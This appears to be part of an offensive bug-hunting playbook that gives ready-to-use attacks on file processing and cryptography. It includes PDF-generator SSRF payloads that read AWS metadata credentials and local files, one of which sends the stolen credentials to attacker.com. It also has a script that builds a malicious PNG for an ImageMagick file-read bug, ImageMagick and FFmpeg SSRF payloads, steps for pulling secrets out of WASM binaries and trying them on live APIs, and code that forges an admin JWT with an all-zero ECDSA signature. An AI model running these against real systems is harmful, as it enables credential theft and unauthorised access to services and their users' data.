# ZDH Phase 26, 29: File Processing Attacks + Cryptographic Weaknesses

## Phase 26 - File Processing Attacks

### PDF Generator SSRF (Headless Chrome / wkhtmltopdf)
```bash
# Find: "Export PDF", "Print Report", "Generate Invoice", "Download" features
# Detect technology: look for Gotenberg, wkhtmltopdf, Puppeteer in error messages

# Inject into any field that renders in the PDF:

# SSRF to AWS metadata:
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>

# Local file read (wkhtmltopdf / older Puppeteer):
<iframe src="file:///etc/passwd"></iframe>
<iframe src="file:///proc/self/environ"></iframe>

# Full wkhtmltopdf exploit (JS enabled by default in old versions):
<script>
  var x = new XMLHttpRequest();
  x.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
  x.send();
  document.write('<img src="https://attacker.com/?d=' + btoa(x.responseText) + '">');
</script>

# Confirm: PDF contains internal data / file content / OOB callback received
```

### ImageMagick & FFmpeg SSRF (CVE-2022-44268 + protocol handlers)
```bash
# ImageMagick - arbitrary file read via PNG tEXt chunk (CVE-2022-44268):
# Create malicious PNG:
python3 -c "
import struct, zlib
def chunk(t, d): c=t+d; return struct.pack('>I',len(d))+c+struct.pack('>I',zlib.crc32(c)&0xffffffff)
sig = b'\x89PNG\r\n\x1a\n'
ihdr = chunk(b'IHDR', struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0))
text = chunk(b'tEXt', b'profile\x00/etc/passwd')  # file to read
idat = chunk(b'IDAT', zlib.compress(b'\x00\xff\xff\xff'))
iend = chunk(b'IEND', b'')
open('exploit.png','wb').write(sig+ihdr+text+idat+iend)
"
# Upload to any image processing endpoint, then view/download the result
# Leaked file contents appear in the processed image metadata

# MVG/MSL file SSRF (ImageMagick protocol handlers):
# Upload file named "exploit.png" with content:
# push graphic-context
# viewbox 0 0 640 480
# image over 0,0 0,0 'http://169.254.169.254/latest/meta-data/'
# pop graphic-context

# FFmpeg HLS SSRF - upload video with playlist referencing internal URLs:
# #EXTM3U
# #EXT-X-MEDIA-SEQUENCE:0
# #EXTINF:,
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### WebAssembly (WASM) Binary Analysis
```bash
# Find WASM files:
# Network tab -> filter by ".wasm" OR grep JS bundles for "WebAssembly.instantiate"

# Download and extract strings:
curl https://<target>/static/app.wasm -o app.wasm
strings app.wasm | grep -iE "(api[_-]?key|secret|token|password|sk_|pk_|Bearer|Authorization)"

# Convert to readable WAT format (WABT toolkit):
wasm2wat app.wasm -o app.wat
grep -i "secret\|key\|token\|password" app.wat

# Full decompile to pseudo-C:
wasm-decompile app.wasm -o app_decompiled.c

# Extract data segment (string constants):
python3 -c "
with open('app.wasm','rb') as f: data=f.read()
import re
for s in re.findall(b'[\x20-\x7e]{8,}', data): print(s.decode())
" | grep -iE "(key|secret|token|api|auth|pass)"

# Confirm: test extracted credentials against live API
```

## Phase 29 - Cryptographic Weaknesses

### ECDSA Nonce Reuse & Psychic Signatures (CVE-2022-21449)
```python
import base64, json

# Step 1: Collect 50+ ES256/ES384 JWT tokens
# Step 2: Decode and compare signature 'r' components
def decode_jwt_sig(token):
    sig_b64 = token.split('.')[2]
    sig = base64.urlsafe_b64decode(sig_b64 + '==')
    r = int.from_bytes(sig[:len(sig)//2], 'big')
    s = int.from_bytes(sig[len(sig)//2:], 'big')
    return r, s

# If any two tokens share the same 'r' value -> private key recoverable
tokens = [...]  # collected JWTs
for i, t1 in enumerate(tokens):
    r1, s1 = decode_jwt_sig(t1)
    for t2 in tokens[i+1:]:
        r2, s2 = decode_jwt_sig(t2)
        if r1 == r2:
            print("NONCE REUSE DETECTED - private key recoverable!")
            # Use: tintinweb/ecdsa-private-key-recovery tool

# CVE-2022-21449 Psychic Signatures (Java JDK 15-18):
# All-zero ECDSA signature passes verification on vulnerable Java versions
# Forge admin JWT:
header  = base64.urlsafe_b64encode(json.dumps({"alg":"ES256","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","iat":9999999999}).encode()).rstrip(b'=')
fake_sig = base64.urlsafe_b64encode(b'\x00' * 64).rstrip(b'=')
forged_jwt = f"{header.decode()}.{payload.decode()}.{fake_sig.decode()}"
# Test against target - if Java 15-18 used (check Server header, error stack traces)
```

**Signal:** `emit_signal VULN_CONFIRMED "PDF SSRF: <engine> -> AWS metadata -> IAM creds extracted" "main/zerodayhunt" 0.97`
